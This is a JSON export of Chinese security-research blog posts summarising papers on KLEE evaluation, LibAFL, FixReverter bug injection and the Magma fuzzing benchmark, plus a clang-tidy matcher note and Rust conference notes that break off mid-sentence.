[{"categories":["论文"],"contents":"KLEE 是知名的符号执行引擎，甚至还有专门的学术会议，第三届 KLEE Workshop 于本月 15-16 日在伦敦召开，大家也可以选择线上免费参会。今天分享的这篇名为 Characterizing and Improving Bug-Finders with Synthetic Bugs 的论文就对 KLEE 发现 bug 的能力做了评估，论文发表于 SANER \u0026lsquo;22，其作者 Brendan Dolan-Gavitt 正是 LAVA 这一自动合成 bug 语料库的开发者，故而论文中用 LAVA 和 Juliet 这两种合成数据集上的表现评估 KLEE 的效果，通过分析哪些 bug 未能被发现来揭示 KLEE 的可靠性（soundness）问题。\nLAVA 是一个源码级别的自动 bug 注入工具，可以向 coreutils 这种 C 程序注入数千个漏洞，尽管支持插入多种 bug，本文中只考虑内存安全 bug 如指针越界读写。\nJuliet Test Suite 由 NSA 开发，包含 64099 个测试用例，按 Common Weakness Enumeration (CWE) 系统分类，其中大多数程序不需要输入且只有一条路径。由于其原本是用于测试静态分析工具，所以用于 KLEE 时需要很多微调，比如调用 klee_make_symbolic 来将程序中的 rand 函数调用符号化。\n本文中的测试分为两部分：首先是对小型程序的测试，作者期待 KLEE 能够探索小型程序的所有路径，所以一旦有 bug 未被发现都表明 KLEE 的可靠性有问题；现实世界中的大型程序则可能有更丰富的特性，不过 KLEE 可能在给定时间内可能难以执行到 bug，作者修改了 KLEE 让其可以根据给定的路径以 concolic 的方式执行，这样就能测试 KLEE 在走到正确路径的情况下能否找到注入的 bug。\n具体来说，对于小型程序测试，作者编写了 62 行的 C 程序 toy.c，用 LAVA 自动生成了 159 个含有单个 bug 的变体，除此之外还从 Juliet Test Suite 中选取了能够成功编译得 LLVM bitcode 的程序，并筛去其中含有 KLEE 明确不支持特性的程序，有一些 CWE 类型比如 (CWE546: Suspicious Comment) 根本不在 KLEE 这种作用于 LLVM IR 的工具的应用场景内，标记为 out of scope，还有些 CWE 理论上可被 KLEE 支持但需要额外修改，标记为 unimplemented，详见下表，最终仅保留 17603 个测试用例。\n对于现实软件的测试则选取了 coreutils 中的十个程序，注入了两千多个 bug，并选择了 200 个具有独特 attack point 的 bug，配有触发 bug 的输入。尽管 KLEE 有自己的 concolic 模式让用户提供输入文件，但作者发现光是这一输入文件不足以让 KLEE 按特定路径执行，于是自己修改了 KLEE，先 trace 一遍记录相关信息，再次运行 Executor::fork 时就不真的 fork 而是挑选和 trace 相匹配的后继状态。\n在用 LAVA 自动生成的 159 个小型 bug 程序变体上，KLEE v1.4 只发现了 68 个，而 KLEE v2.2 则发现了 150 个。为了理解为什么 KLEE v1.4 漏报了许多漏洞，作者将插入的 bug 分为两类，一些是插在用户自定义的函数（即程序 main 源码）中，另一些是插在外部函数（如 libc 函数）调用的参数中。KLEE v1.4 漏报的 bug 大部分属于后者，因为其不检查传递给外部函数的指针，剩余少数漏报的 bug 则多是由于缺乏浮点数支持，KLEE v2.2 漏报的 5 个也是如此。\n由于 LAVA 注入的 bug 都是简单的指针错误，作者还在 Juliet Test Suite 上进行测试，在总共 17603 个支持的测试用例上，KLEE 报告了 18868 个 true postive, 732 个 false positive，和 2013 个 false negative，报告 bug 比测试用例还多是因为设置了 KLEE 记录所有的错误，只有在一个 testcase 没有生成任何报告的情况下才认为其是 false negative，即漏报。\n作者发现部分 false positive（误报）是由于程序本身执行错误，还有一些是因为不支持 C++ 或是 Juliet Test Suite 本身的问题。部分 false negative（漏报）则是由于 KLEE 实现上的一些限制，因为 Juliet Test Suite 原本针对静态分析器故而没有提供触发输入，难以使用 concolic execution 来执行可触发 bug 的路径，导致无法区分漏报究竟是由于尚未探索到路径还是 KLEE 本身的可靠性问题。\n而如前所述，在用 LAVA 给 coreutils 插入 bug 时使用了 concolic execution 以让 KLEE 按触发 bug 的路径执行程序，排除了路径爆炸问题造成的影响。最终结论是 KLEE 在现实应用上检测 bug 的能力尚可，主要问题是 KLEE 采用的 uClibc 和 glibc 的差异较大，可能造成误报或漏报。\n根据以上实验结果，作者对 KLEE 给出了中肯的评价：尽管 KLEE 在浮点数、外部函数和 C++ 语言特性支持上存在一些限制，但这些都是文档中明确表示的已知缺陷，除此之外用户不太会遇到其他问题，作者认为这恰恰是 KLEE 作为一个成熟的符号执行引擎的标志。因此，当使用 KLEE 测试现实软件时，应当更多专注特性的支持和与其他库的交互，比如实现更多系统调用和支持多线程，这些工作已经部分存在于科研向的 fork 中，希望能被添加到上游并持续维护。\n最后作者还提出了对符号执行引擎 test suite 的迫切需求，不同于针对静态分析工具的 Juliet Test Suite，它应该：\n 带有触发输入（triggering inputs）作为基准真相（ground truth） 包含广范围的 bug，囊括多种 CWE 关注能被符号执行检测的 bug 种类，避免或标注出仅适用于静态分析的 bug 将程序输入和不确定性来源标准化，使之能容易地被符号化  论文地址：https://messlab.moyix.net/papers/evalklee_saner22.pdf\nJuliet Test Suite 地址：https://github.com/yh570/Juliet_test_suite\nLAVA Corpus 地址：https://github.com/yh570/LAVA_corpus\nConcolic KLEE 地址：https://github.com/yh570/Concolic_klee\n","date":"2022-09-14T12:20:48+08:00","permalink":"https://chinggg.github.io/post/evalklee-saner22/","tags":["学术","安全","符号执行"],"title":"用合成 bug 评估KLEE：Characterizing and Improving Bug-Finders with Synthetic Bugs"},{"categories":["安全"],"contents":"Documents https://clang.llvm.org/docs/LibASTMatchersReference.html\nhttps://clang.llvm.org/extra/clang-tidy/\nhttps://clang.llvm.org/extra/clang-tidy/Contributing.html\nhttps://clang.llvm.org/docs/ClangTransformerTutorial.html\nEqual Null 论文 FixReverter 提出了三种 bugfix pattern，尝试用 Clang Transformer 添加 clang-tidy checker 来快速复现，但遇到了一些问题。\n比如论文中提到 Abort Pattern，以 binutils 中的 bfd/compress.c 为例，插入了判断指针为 NULL 的 if 语句，但我的 checker 居然无法发现这种简单的 NULL 判断。\n但 checker 在我构造的测试程序上表现良好：\n#include \u0026lt;cstdio\u0026gt; #include \u0026lt;cstdlib\u0026gt; #include \u0026lt;cstring\u0026gt; struct O { int x; char *s; }; struct M { int num; char *name; O *o; }; int main() { const char *s = \u0026quot;hello world\u0026quot;; M *m = (M *)malloc(sizeof(M)); if (m == NULL || m-\u0026gt;num == 0 || m-\u0026gt;name + 1 == NULL || m-\u0026gt;o == NULL) { return -1; } size_t len = strlen(s); if (s == NULL) { puts(\u0026quot;NULL!!\u0026quot;); return -1; } if (strlen(s) \u0026gt; 4) return -1; else if (sizeof(s) \u0026lt; puts(s)) return 1; for (int i = 0; i \u0026lt; len; i++) { if (s[i] == ' ') { break; } } return 0; }  以判断 NULL 为例，实现 matcher 的核心代码如下，能在测试程序上正常运行，但对 bfd/compress.c 运行没有任何结果\nauto PtrVar = hasType(isAnyPointer()); auto PtrTracer = expr(anyOf(declRefExpr(PtrVar), memberExpr(member(PtrVar)))); auto EqNull = binaryOperator(hasOperatorName(\u0026quot;==\u0026quot;), hasOperands(PtrTracer, ignoringImpCasts(nullPointerConstant())));  即使将上述代码复制进 bfd/compress.c 依然无法识别出结果，用 clang-query 亦无法匹配成功。\n","date":"2022-09-08T13:46:52Z","permalink":"https://chinggg.github.io/post/clang-tidy/","tags":["Static Analysis"],"title":"Clang-Tidy Checker with Transformer"},{"categories":["论文"],"contents":"如今系统安全方向的论文在代码开源上已经展开了激烈的军备竞赛，一篇文章动辄成千上万行的代码量，今天我们推荐的这篇 LibAFL 则更胜一筹，先有开源工具再顺便写了篇论文，还发到了 CCS 2022。\nFuzzing 研究百花齐放，工具层出不穷，很多都基于 AFL/AFL++ 进行二次开发，互相之间却又不兼容，让引入新特性和验证工作效果非常麻烦，本文作者身为 AFL++ 社区的主要维护者，对目前 fuzzer 界分裂的现状深感不满，认为这不仅是工程问题，更反映了目前对 fuzzer 的实体（entity）缺乏一个标准的定义，于是他提出了如下 9 个实体来定义 modern fuzzer 的组成：\n Input：程序的输入。重点是其在 fuzzer 内部的表现形式，最常见的就是 byte array，不过其不适用于一些特殊场景，比如 grammar fuzzer 会将输入存储为 AST 等结构，在发送给目标程序前才会序列化为字节序列。 Corpus：输入和其附属元数据的存储。若位于内存中会导致较大的资源消耗，若位于磁盘则方便用户观察 fuzzer 的状态，代价是速度受到磁盘读写的瓶颈制约，主流 fuzzer 大多选择后者。此外，存储时还要区分有助于进化的 interesting testcase 和最终触发 crash 的 solution。 Scheduler：从 corpus 中选取 testcase 的调度策略。最朴素的即先进先出或随机选择，近年来也有工作利用调度来给 testcase 排优先级或是防止 testcase 爆炸。 Stage：定义对单个 testcase 进行的操作（action）。在 scheduler 选择了一个 testcase 后，fuzzer 会在其上进行分阶段的操作，比如 AFL 中的 random havoc stage 会对输入进行多种变异操作，许多 fuzzer 都有 minimization phase 以在保持覆盖率的同时减小 testcase，这也是一种 stage。 Observer：提供一次执行目标程序的信息。从对 fuzzer state 的影响看，observer 的快照应当和执行本身应当是等效的，这样在分布式 fuzzer 或是执行很慢的目标程序上会比较有帮助。覆盖导向型 fuzzer 中常用的 coverage map 就是一种 observer。 Executor：用 fuzzer 的输入来执行目标程序。不同 fuzzer 在这方面区别可能很大，libFuzzer 这种 in-memory fuzzer 只需调用 harness 函数，Nyx 这种 hypervisor-based fuzzer 则每次执行都要从快照重启整个系统。 Feedback：将程序执行的结果分类以决定是否将其加入 corpus。大多数情况下 Feedback 和 observer 紧密相连但又有所不同，feedback 通常处理一个或多个 observer 报告的信息来判断 execution 是否 \u0026ldquo;interesting\u0026rdquo;，是否是满足条件的 solution，比如可观测的 crash。 Mutator：从一个或多个输入生成新的 testcase。这部分通常是定制 fuzzer 时最常改动的，不同 mutator 可以组合，往往还和特定的输入类型绑定，比如传统 fuzzer 中常见的是比特级别的变异，比如 bit flip 和 blocks swapping，而 grammar fuzzer 中的 mutator 则可交换 AST 上的节点来进行变异。 Generator：凭空产生新的输入。有随机生成的，也有 Nautilus 这种基于语法的。  基于上面这许多抽象的定义，作者用 Rust 实现了 LibAFL，有三个主要组成部分：核心组件 LibAFL Core, 在目标程序中运行的 LibAFL Targets，提供编译 wrapper 的 LibAFL CC，除此之外还包含了几个插桩后端（Instrumentation Backends），下图描绘了 LibAFL Core 的架构：\n从图中可以看到 LibAFL 的组成部分，除了 State, Fuzzer 和 Events Manager 这三个大模块之外，大部分都一一对应前文所定义的 9 大实体。总之，模块化的设计让 LibAFL 天生具有极强的 Extensibility，基于 Rust 实现，独立于平台和不依赖标准库带来了 Portability，Event Manager 使得多节点并行 fuzz 的 Scalability 成为可能，这便是 LibAFL 设计之初所遵循的三个原则。\n实验部分主要是用 LibAFL 实现了各种 fuzzing 技术并评估其在解决不同问题上的效果，这里就不一一展示了，看完只觉得略有些恐怖，LibAFL 就像手术刀一样把所有 fuzz 技术都剖析得清清楚楚，有没有可能之后所有的 fuzz 工作都需要用 LibAFL 实现一下才能服众？\n在文末作者还介绍了目前的缺陷主要是缺少链接时优化（Link Time Optimization） passes，不能分析整个程序的控制流图，无法实现 directed fuzzing，不过这一特性的支持只是时间问题。未来可以着重关注并实现的强大功能是 concolic tracing API，可以解决传统 concolic fuzzer 中 concolic engine 和 fuzzer 难以协作和伸缩性差的问题。\n简要介绍完了论文，我们再来关注一下项目本身一些有趣的点：\n作者选择用 Rust 实现 LibAFL，并在文中特意强调了零开销抽象带来的好处，无独有偶，在结束不久的的第二届中国 Rust 开发者大会上，陈鹏老师展示了如何用 Rust 从零实现 fuzzer，他发表在 IEEE S\u0026amp;P 2018 的 Angora: Efficient Fuzzing by Principled Search 就是「第一个用 Rust 实现的开源 fuzzer」，详情可见 SHU 开源社区的这篇推文，总之我们期待 Rust 在安全研究中得到广泛应用。\n其他论文放出的开源代码往往只有作者自己维护，而 LibAFL 则从一开始就是 AFL++ 社区的开源项目，如果你感兴趣，就有机会直接贡献代码。本文第三作者就在 Google Summer of Code 2021 中为 LibAFL 实现了 AFLFast 和 MOpt 这两种 scheduler，目前已是项目的主要维护者之一，而今年的 Google Summer of Code 则有另一位学生将 Nyx 引入 LibAFL，这可能说明了参与开源和进行研究也是相辅相成的，总有人在论文发到飞起的同时还能让 GitHub 绿点满满，让人不得不佩服。\n论文地址：https://www.s3.eurecom.fr/docs/ccs22_fioraldi.pdf\n项目地址：https://github.com/AFLplusplus/LibAFL\nArtifacts 地址：https://github.com/AFLplusplus/libafl_paper_artifacts\n","date":"2022-08-24T20:20:48+08:00","permalink":"https://chinggg.github.io/post/libafl/","tags":["学术","安全"],"title":"LibAFL：构建模块化可复用 fuzzer 的框架"},{"categories":["论文"],"contents":"要实现一个 fuzzing benchmark，必不可少的一步是制作 bug 数据集，以往的工作要么耗费人力使用真实 CVE，要么牺牲现实性自动插入人工合成的 bug，而我们之前讲过的 Magma 虽然使用了 forward-porting 来将真实 bug 插入到软件的最新版本，但获得 ground-truth 仍离不开大量人力。今天推荐的文章 FixReverter 则独具慧眼地从大量 CVE 的修复中总结出三种 bugfix pattern，通过语法匹配来自动识别程序中的 bugfix ，逆转这些 bugfix 即可自动插入具有现实性的 bug。我们在一个月前就注意到了这个工作，但文章直到上周 USENIX Security 2022 会议进行时才公布，还获得了 distinguished paper award。\n背景动机 和 Magma 一样，为了证明自己发明新 benchmark 的必要性和优越性，作者上来先规定了四个小目标（Goal）：\n 目标程序应当和现实世界相关 程序中应当包含现实 bug 要能清晰地判定 bug 触发以避免去重（deduplication)的问题 benchmark 要能抵抗过拟合（overfitting）  实际上这几个目标和 Magma 所提出的理想 benchmark 属性有所重合，Magma 中定义的 diversity 已包含了前两个目标强调的现实性，第三个目标则体现为 Magma 中的 verifiablity，这些目标已经被 Magma 用来对 FuzzBench, UniFuzz, CGC 等 benchmark 进行了批判。而最后一个目标防止 overfitting 其实 Magma 作者也有考虑，其在论文中表示这是 static benchmark 的通病，不过 Magma 采用 forward-porting 快速更新目标程序可以一定程度上减缓这个问题。\nFixReverter 就利用抗过拟合这一点证明了自己工作的价值：自动注入 bug 来构建的 benchmark 可以抵御 overfitting，而且和 LAVA 这种注入合成 bug 的方法不同，FixReverter 通过观察大量 bugfix 归纳出了三种常见修复模式（bugfix pattern），可以通过自动匹配并逆转程序中的修复模式来达到注入现实 bug 的效果，作者还基于 FixReverter 开发了 RevBugBench，并集成到 FuzzBench 中对 5 种 fuzzer 进行了评测。\nBugfix Pattern 通过观察六个开源软件和 Magma 数据集中一共 814 个 CVE，作者最终使用了 170 个 CVE 匹配出三种通用的修复模式，即 conditional-abort (ABORT), conditional-execute (EXEC) 和 conditional-assign (ASSIGN)。\nABORT 就是在下游代码解引用（dereference）某一变量之前检查其是否满足某一不变式（invariant），若不满足则直接跳出控制流，如下图就是 ABORT 模式修复空指针解引用的一个例子：\nEXEC 就是在现有条件语句里再加上一个布尔表达式来检查条件体里被解引用的变量是否满足某一不变式，这样的修复使 true 分支的条件更为严格，如下图就是 EXEC 模式修复空指针引用的一个例子：\nASSIGN 就是在下游代码解引用某一变量之前加上一个 if 语句给变量赋新值，如下图就是 ASSIGN 模式修复越界写错误的一个例子：\n这三种模式都和条件语句相关，解引用代码所处的位置可能在条件表达式内或是随后的程序中，这影响了不同 pattern 所适用的语义条件（semantic condition）。\nFixReverter 整体架构如下图所示：\n首先用上下文无关文法（context-free grammar, CFG）定义了下图所示的修复模式和条件表达式：\n在这些密密麻麻的语法中，有一些终结符（terminal）代表 tracer，用来识别被解引用的变量。\nFixReverter 用 Clang LibTool 实现了语法匹配器（syntax matcher）来读入上面提到的这些语法文件，将其转化为状态机，然后以访问者模式遍历 Clang AST，在遇到的每个语句中寻找 token 并喂给状态机来匹配定义的 pattern，收集到的 token 会被放入 JSON 文件中以供后续阶段使用。\nFixReverter 的静态可达性和依赖分析（static reachability \u0026amp; dependence analysis）会收集 syntax matcher 输出的 tracer，判断其是否在给定的入点可达，以及随后的解引用是否依赖于 tracer。从污点分析的角度看，tracer 就是 source，随后的解引用是 sink，比如读写 traced pointer。当 bugfix 被逆转，程序直接执行到 sink 处就可能触发 bug。\n静态分析的具体实现基于 Phasar 框架，并扩展了其现有的 IFDSTaintAnalysis 模块，解决了其中一些问题，但仍受限于其 unsound 的控制流分析，可能会导致漏报。\nFixReverter 的 bug 注入器（injecter）基于 Clang LibTool 实现，注入的代码能够区分 fuzz 执行中 not reached, reached, trigger 的三种状态，这部分和 Magma 类似，通过插入预处理宏来适应不同的场景。如下图所示，当 FRCOV 宏未定义时，原本的 ABORT 模式被替换为 if(0) continue，没有引入新的分支所以不会让控制流敏感的 fuzzer 产生 bias。而当定义了 FRCOV 宏之后，可以启用额外的逻辑来检查是否满足 trigger 条件，并和 reach 区分，用于之后的 traige 过程。此外，单个 injection 是否被开启也可以通过环境变量控制，最终会影响下图中 injectFlag[529] 的值。\n当然这样注入的 bug 可能有一些质量并不高，RixReverter 会用 naive bug filter 筛除掉，具体来说就是导致程序自带单元测试失败，或是用 fuzz 的初始输入就能触发的 bug 会被丢弃。\n当 fuzzer 导致程序产生 crash，作者还希望 FixReverter 报告原因，这并没有看上去那么简单，因为一个条件被触发并不意味着 dependent variable 一定（must）会被解引用，而只是能够（could）。运行单个输入可能触发好几个 injection，所以需要一个诊断（triage）的过程来判断哪些是产生 crash 的必要 bug，最终区分如下两类原因：\n 当程序输入 $I$ 在注入单个 bug（假设为 $A$ ）就足以导致 crash 时，认为是触发 $A$ 是 individual cause 当程序输入只有在注入多个 bug（假设为 $A$, $B$）才导致 crash 时，认为触发原因是 combination of $A$ and $B$  Bug triage 的算法如下所示，就是先找 invidudual causes 再找 combination causes。\nRevBugBench 有了 FixReverter 这个 bug 注入器后就能做一个 benchmark，作者共选择了 10 个目标程序，其中 8 个来自 FuzzBench，另外 2 个是 binutils 中常用的两个工具。如下表所示，经过语法匹配、静态分析和最终筛选之后一共注入了超过 7900 个 bug，静态分析丢弃了最初语法匹配所得 bug 中的 71% ，而 naive bug filter 只筛除了 102 个 bug。\nFuzzBench 是一个集成了许多 fuzzer 的 benchmark 服务，但其主要关注的是代码覆盖率，用 stack trace 来区分 bug 的方式并不可靠，作者把 RevBugBench 集成到 FuzzBench 以对不同 fuzzer 探索现实应用中 bug 的能力做大规模且可复现的评估。具体来说扩展了 FuzzBench 的三个关键组件，即 benchmarks (target programs), measurer (on-the-fly result analyzer) 和 reporter (statistical analysis of results)。\n最终在 AFL, libFuzzer, AFL++, Eclipser 和 FairFuzz 这 5 个 fuzzer 上的实验结果如下表所示，其中 MetaFuzzer 是所有 fuzzer 发现 bug 之和，代表了结果的上界。\n不同 fuzzer 所发现 individual bugs 的文氏图如下：\n这几个 fuzzer 之间比较的结果和 Magma 的结论一样，AFL++ 综合表现最好。不过更重要的是用 fuzz 的结果来评估 FixReverter 和 RevBugBench 本身的作用，作者考虑如下三个问题：\n FixReverter 是否注入了 fuzzer 能发现的 bug？由于静态分析天然具有 conservative 和 overapproximate 的特性，注入的数千个 bug 中只触发了两百个 individual cause，但从不同 fuzzer 得到的结果看还是有大量 bug 能被发现。 FixReverter 是否能注入难以发现的 bug？根据上面的文氏图，只有约 40% 的 individual bug 能被所有 fuzzer 检测，约 19% 的 individual 只会被一种 fuzzer 检测，这说明 FixReverter 注入的 bug 不会对单个 fuzzer 过拟合。 RevBugBench 中的 fuzzer 是否能检测 combination causes？从表中结果来看，所有程序都能检测到 combination causes，不同 fuzzer 的相对性能在使用 individual causes 或 all causes 作为指标时表现相一致。  总结展望 作者通过观察 CVE 中的 bugfix pattern，运用语法匹配和静态分析来查找并逆转这些 pattern，提出了 FixReverter 这一自动注入 bug 的框架，让 benchmark 随着新插入的 bug 和新的 pattern 不断进化。\n作者表示后续会在静态分析上进行改进，让结果更加 sound。还有就是扩展新的 bugfix pattern，作者计划引入新的 pattern 不涉及控制流变化，而是定义新的 semantic condition。\n此外，作者在社交媒体上表示除了已经释出的 artifact，月末还将发布论文附录来介绍 artifacts，大家可以持续关注！\n论文地址：https://www.usenix.org/system/files/sec22-zhang-zenong.pdf\nArtifact 地址：https://zenodo.org/record/6831960\n","date":"2022-08-17T12:20:48+08:00","permalink":"https://chinggg.github.io/post/fixreverter/","tags":["学术","安全"],"title":"FixReverter：为 fuzz benchmark 插入真实 bug 的方法"},{"categories":["论文"],"contents":"之前我们分享过 ISSTA 2022 中一篇对静态分析检测漏洞效果进行评估的文章，与其他使用 LAVA-M 合成数据集的工作不同，它的数据集主要基于 Magma，包含了一百多个真实的 CVE。而 Magma 原本是 Mathias Payer 领衔的 HexHive 组发布的 ground-truth fuzzing benchmark，论文发布于 2020 年底，代码目前仍有人维护更新，今天我们就来炒一炒冷饭，看看同样是「熔岩」的 Magma 比 LAVA 猛在哪里。\n官网地址：https://hexhive.epfl.ch/magma/\n论文地址：https://hexhive.epfl.ch/publications/files/21SIGMETRICS.pdf\n代码地址：https://github.com/HexHive/magma\n视频地址：https://www.youtube.com/watch?v=N6kePNadUV8\n背景动机 Fuzzing 技术种类繁多，但不管是黑盒还是白盒，基于语法还是变异，本质上都是非常随机的过程，这使得评价和比较不同的 fuzzer 极为困难。\nKlees 等人在 CCS 2018 年的工作 Evaluating Fuzz Testing 调研了 32 篇 fuzzing 论文，发现没有一篇能提供足够的细节来证明其 fuzzer 的改进，他们强调了一些评估 fuzzer 工作的普遍标准：\n Performance metrics: 触发 crash 的数量和代码覆盖率都是广泛应用的指标，但没有证据表明两者和发现漏洞的数量有强关联，而判定 ground-truth bug 需要大量专家经验 Targets: 要有多样性和现实性 Seed selection: 在各论重复实验和不同 fuzzer 评估中应当保持一致 Trial duration (timeout): 一次 trial 是指 fuzzer 在目标程序上的一次运行，时间必须固定 Number of trials: fuzz 这种随机性强的技术需要大量重复，fuzzing campaign 是指在同一目标上运行固定次数的 trial  本文对比了现存的 fuzzer benchmark，不是 target 数量少就是 bug 种类单一，用人工合成 bug 的难以评估 fuzzer 在真实复杂软件上的效果，用真实 bug 的分布都较为稀疏而且缺乏 ground truth。\n那么理想的 benchmark 应该满足哪些属性呢？本文从以下三个方面考虑：\n  Diversity (P1): bug 和目标程序都要足够多样且具有现实性\n  Verifiability (P2)：要提供 easy access to ground-truth metrics，描述 bug 如何被 reach, trigger 和 detect\n  Usability (P3)：提供的目标程序集上要有大量可发现的 bug，且易于检验并报告 fuzzer 进展和效果\n  Magma 的方法论 目标程序的多样性分析 首先目标程序（即含有 bug 的被测程序）的选择，论文发布时只有 7 个目标程序（截止到 2022 年 8 月，最新版是 v1.2 已经有 9 个目标程序）。文中为了表现其选择的多样性，列了一张表格说明各程序的不同特性。\n为了和现有其他 benchmark 比较目标程序的多样性，从中选取了两百多个 subject（就是 fuzz 可执行程序，文中说是 libFuzzer 的术语，但网上查证没有结果），使用 Intel Pin 来记录其指令执行，并按照 Intel XED 将指令分类，最后做了一个主成分分析（Principal Component Analysis, PCA）来显示不同 benchmark 所用目标程序的差异，取前四个主成分，在二维平面上的结果如下图所示。\n漏洞多样性和前向移植 在 Bug 的选择上本文也和其他 benchmark 做了比较，Magma 所选 bug 覆盖的 CWE 种类数仅次于 CGC，bug 密度（平均每个目标程序所含的 bug 数）仅次于 LAVA-M，但其他两个都只用了合成的 bug，不能反映现实世界中漏洞的多样性。\n值得一提的是 Magma 使用 forward-port 把 bug 插入到软件的最新版本中，而不是像现有 benchmark 使用受 bug 影响的老版本，这样做很明显的好处就是易扩展，能插入任意 bug 而不受版本限制。插入 bug 首先要从漏洞报告中找到包含修复的 commit(s)，把修复后的代码改回到原状态，并识别出能触发 bug 的状态，编写布尔表达式来作为识别 bug 触发的 oracle，这些过程不太可能全都自动化，故所有 bug 都是手动移植并验证的。\n精细的性能评价指标 前文已经讲过 crash count 和 code coverage 不足以评价检测漏洞的效果，而本文作者认为单纯对 bug 计数粒度也不够细，还要区分 reach, trigger 和 detect：代码覆盖到相应的路径只是在控制流上满足条件，还要满足对应的程序状态即数据流的条件才能够触发 bug，但即使如此 fuzzer 也未必能成功检测到错误，sanitizer 更擅长检测内存和算术上的错误，而资源耗尽导致的拒绝服务型漏洞往往要在被触发后等待至超时才会被发现，语义和逻辑型漏洞则更加隐蔽。现在有一些工作意在检测特定种类的漏洞，所以作者认为 bug detection rate 也是评价 fuzz 技术进展的一个重要维度。\n重要问题与 Magma 的选择 Magma 专注于评估 fuzzing，并不试图成为通用的漏洞检测 benchmark，所以专门考虑了一些 fuzzing 特有的问题，其在设计和实现上的一些选择也正出于此，这里只挑出一部分介绍。\nWeird States 当 fuzzer 触发了一个 bug 但未能检测出并继续执行时，程序实际上进入了非确定性的状态，即 [weird state](http://www.dullien.net/thomas/weird-machines-exploitability.pdf)，在此之后收集到的信息都是不可靠的，因此 Magma 只收集进入 weird state 之前的 oracle data，文中举了下图中的例子来说明 weird state 可能导致意料之外的漏洞触发。\nStatic Benchmark 作者认为 Magma 和 SPEC CPU 等其他常见的性能 benchmark 一样都属于 static benchmark，好处是包含现实应用程序，缺点是可能导致开发者专门对 benchmark 进行 overfitting，动态合成的 benchmark 能克服 overfitting 问题，但是目前的技术很难合成反映现实开发场景的大型程序。好在 Magma 的 forward-porting 可以很容易地更新目标程序，从而一定程度上防止了 overfitting。\nLeaky Oracles 在 benchmark 中包含 oracle 可能泄漏一些信息导致对 fuzzer 探索能力的干扰，比如 fuzzer 检测到作为 if 语句的 oracle 就会尝试生成满足分支条件的输入数据，可能造成 overfitting。为此 Magma 使用了 always-evaluate memory writes，定制了 x86 汇编以在单个基本块中进行逻辑运算，避免短路行为，下图就是 Magma 在程序中插入 canary 的一个例子。\nProofs of Vulnerability 为了增强对插入 bug 的信心，对每一个 bug 最好要提供一个 proof of vulnerability (PoV) 来验证 bug 可以被触发，这无疑需要专业知识和大量人力。只有部分 bug 可以从公开报告中提取 PoV，否则作者就跑很多 fuzz 来尝试获得能触发 bug 的 PoV，如果无法生成就再手动分析触发条件是否能被满足。这段原文只有几行，但背后工作量应该不小。\n实验评估 前文其实已经在设计方法上对 Magma 和其他 benchmark 做了很多对比，这里实验评估则是用 Magma 对不同的 fuzzer 进行 benchmark，实验结果可以对比不同 fuzzer 的效果差异，文中还分析了一些特定案例来解释不同 fuzzer 在不同 bug 上表现各异的原因。\n如下图所示，文中对 AFL, AFLFast, AFL++, FairFuzz, MOpt-AFL, honggfuzz 和 SymCC-AFL 一共 7 个 fuzzer 在 7 个目标程序上触发的 bug 数量进行了评估，还使用曼-惠特尼U检验（Mann-Whitney U-test）这个看上去很高深的统计学方法来分析了不同 fuzzer 结果的相似性，结论是 AFL++ 平均 bug 检出量最高，而 AFL, AFLFast, AFL++ 和 SymCC-AFL 在大多数目标程序上表现接近。\n此外，文章还用一页篇幅分析了不同 fuzzer 在 reach 和 trigger 不同 bug 上所需的时间，绘制了如下曲线图，文末附录还列出了长长的表格，总之结论类似龟兔赛跑：尽管 honggfuzz 在 24 小时内触发了最多的 bug，但 MOpt-AFL 在长达七天的 long fuzzing campaigns 中成为了最后的赢家。\n评估部分的最后一段 LAVA-M 再做了下比较，结论就是 LAVA-M 中的 bug 种类太单一，对能检测 magic-value 的 fuzzer 有很明显的倾向性。\n总结讨论 文末再次强调 Magma 和其他现有 benchmark 不同之处就在于能提供唾手可得的 ground truth，但也承认总共 118 个 bug 中只有 45% 有能证明触发的 PoV，作者把生成更多的 PoV 作为 open challenge，之后 Magma 也会持续进化以获得更多带 PoV 的 bug。\nMagma 的插桩没有收集关于 detected bug 的信息，因为 detection 是 fuzzer 的特性而不只和 bug 本身有关，但可以通过 post-processing 来评估这一指标，结论就是老生常谈的 bug 不限于 crash，需要考虑 bug 的不同表现。就检测 bug 的不同时机而言，reach 主要体现路径探索能力，trigger 和 detect 则更多依赖约束生成求解能力，关注 detect 也能帮助识别哪些 bug 更不容易被现存的 santitization 技术发现。\n个人认为比较可惜的一点是没有对 fuzzer 在检测不同种类 CWE 的 bug 上的效果做一个对比，文中甚至没有列出具体覆盖了哪些 CWE，而之前介绍 ISSTA 2022 上 An Empirical Study on the Effectiveness of Static C Code Analyzers for Vulnerability Detection 这篇工作倒是重点着墨 CWE 分类。\n","date":"2022-08-05T15:20:48+08:00","permalink":"https://chinggg.github.io/post/magma/","tags":["学术","安全"],"title":"Magma: A Ground-Truth Fuzzing Benchmark"},{"categories":["记录"],"contents":"第二届中国 Rust 开发者大会（Rust China Conf）原本该于 2021 年底在上海西岸智塔举办，可惜由于疫情延期到了今年，以全线上的方式开展，为时一天，上午是主会场，下午是多个分会场及 workshop 同时进行。会议内容之后会有官方的录播和回顾，本文只是对自己所参与两个会场的内容做简要整理，以让读者能够快速捕捉感兴趣的话题。\n主会场 9:00 -12:00，包括四个专题分享和圆桌论坛\n Rustdoc：你可以用它做什么，以及它的未来\nGuillaume Gomez，华为工程师，Rustdoc Team Leader\n 介绍了 rustdoc 的功能特性和一些高级用法，由于时差原因没有 Q\u0026amp;A 环节，详细内容请见官方回放。\n Rust 计算加速技术解读及高性能代码重构实践\n李原，华为工程师\n SIMD 是提高程序计算性能的重要方式，Rust 中的 SIMD 架构设计如下图：\n具体实现有 stdarch 和 portable-simd，还介绍了其他计算加速技术，并举例说明了 SIMD 重构中的关键点定位和方法实践，详细内容可见官方回放。\n 从零开始实现Rust Fuzzer\n陈鹏，腾讯安全大数据实验室安全研究员\n 陈鹏老师在 IEEE S\u0026amp;P 2018 上发表了 Angora: Efficient Fuzzing by Principled Search，用他幻灯片中的话说「可能是第一个用 Rust 实现的开源 Fuzzer」，注意这里指的是 Rust 来生成输入，对 Rust 代码进行测试是另一类工作。\n好的 Fuzzer 要能生成高质量的输入，最原始的输入可从无状态的分布中获得，但为了达到更好的效果需要借助覆盖反馈和 type aware 生成有状态的分布，幻灯片中结合 Rust 实例代码讲解了生成和变异行为的实现。\n除了生成高质量输入，Fuzzer 在执行时还需要考虑捕获异常，比如 Panic, Abort 和 Unsafe，并保留上下文以复现异常。\n总之 Rust 能帮助开发者抽象输入生成，编写高效执行的 Fuzzer 并尽量避免 